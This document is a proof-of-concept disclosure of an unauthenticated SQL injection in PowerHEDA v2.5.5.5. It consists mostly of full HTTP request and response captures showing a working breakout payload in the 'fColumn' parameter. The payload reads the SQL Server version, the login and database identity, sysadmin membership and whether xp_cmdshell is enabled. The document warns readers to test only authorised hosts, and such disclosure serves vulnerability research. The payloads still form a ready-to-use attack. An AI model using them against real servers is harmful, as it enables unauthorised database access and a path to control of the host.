# Proof of Concept — Unauthenticated SQL Injection in PowerHEDA v2.5.5.5

Reproduce only on a lab instance or a host you are authorised to test. Do not run these requests against third-party universities.

Captures below are Burp Repeater style (full HTTP request and response). The customer hostname is redacted to `<powerheda-host>`. **No `Cookie` header.** Only `fColumn` changes.

The method concatenates `fColumn` as a T-SQL identifier. The working breakout is:

```text
x] FROM (SELECT <expression> AS [x]) t --
```

`sysadmin` / `xp_cmdshell` values below are this install’s SQL configuration. They are not required for the product bug. No operating-system command is included.

---

## 1. Identifier concatenation (not a column)

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 38
Connection: close

{"fColumn":"1","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 500 Internal Server Error
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
jsonerror: true
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 476
Connection: close

{"Message":"Invalid column name '1'.","StackTrace":"   at heda_be.Data.db.GetData(String commandText, Dictionary`2 parameters, CommandType commandType) in C:\\Dev\\Projects\\PowerHEDA\\heda_be\\Data\\db.vb:line 201\r\n   at PowerHEDA.QueryBuilderDataRetrieval.GetFilterUniqueItems(String fColumn, String fKey, String fWhere) in C:\\Dev\\Projects\\PowerHEDA V255\\PowerHEDA\\webservices\\HedaDataRetrieval.asmx.vb:line 600","ExceptionType":"System.Data.SqlClient.SqlException"}
```

---

## 2. SQL execution — `@@VERSION`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 75
Connection: close

{"fColumn":"x] FROM (SELECT @@VERSION AS [x]) t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 275
Connection: close

{"d":["Microsoft SQL Server 2017 (RTM-GDR) (KB5063760) - 14.0.2080.1 (X64) \n\tJul 14 2025 12:59:30 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition: Core-based Licensing (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n"]}
```

---

## 3. Additional identity payloads

Each of these is HTTP `200` with no session cookie.

### `SYSTEM_USER`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 77
Connection: close

{"fColumn":"x] FROM (SELECT SYSTEM_USER AS [x]) t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 18
Connection: close

{"d":["hedauser"]}
```

### `USER_NAME()`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 77
Connection: close

{"fColumn":"x] FROM (SELECT USER_NAME() AS [x]) t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 13
Connection: close

{"d":["dbo"]}
```

### `DB_NAME()`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 75
Connection: close

{"fColumn":"x] FROM (SELECT DB_NAME() AS [x]) t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 19
Connection: close

{"d":["PowerHEDA"]}
```

### `IS_SRVROLEMEMBER('sysadmin')`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 115
Connection: close

{"fColumn":"x] FROM (SELECT CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(10)) AS [x]) t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 11
Connection: close

{"d":["1"]}
```

### `IS_MEMBER('db_owner')`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: close

{"fColumn":"x] FROM (SELECT CAST(IS_MEMBER('db_owner') AS varchar(10)) AS [x]) t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 11
Connection: close

{"d":["1"]}
```

### `xp_cmdshell` configuration (`value_in_use` only)

This reads `sys.configurations`. It does **not** invoke `xp_cmdshell`.

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 150
Connection: close

{"fColumn":"x] FROM (SELECT CAST(value_in_use AS varchar(10)) AS [x] FROM sys.configurations WHERE name = 'xp_cmdshell') t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 11
Connection: close

{"d":["1"]}
```

### Combined identity (one request)

`login | db user | database | sysadmin | xp_cmdshell value_in_use`

**Request**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 285
Connection: close

{"fColumn":"x] FROM (SELECT SYSTEM_USER + N'|' + USER_NAME() + N'|' + DB_NAME() + N'|' + CAST(IS_SRVROLEMEMBER(N'sysadmin') AS nvarchar(4)) + N'|' + CAST(CAST(value_in_use AS int) AS nvarchar(4)) AS [x] FROM sys.configurations WHERE name = N'xp_cmdshell') t --","fKey":"5","fWhere":""}
```

**Response**

```http
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Security-Policy: frame-ancestors 'self';
Content-Length: 36
Connection: close

{"d":["hedauser|dbo|PowerHEDA|1|1"]}
```
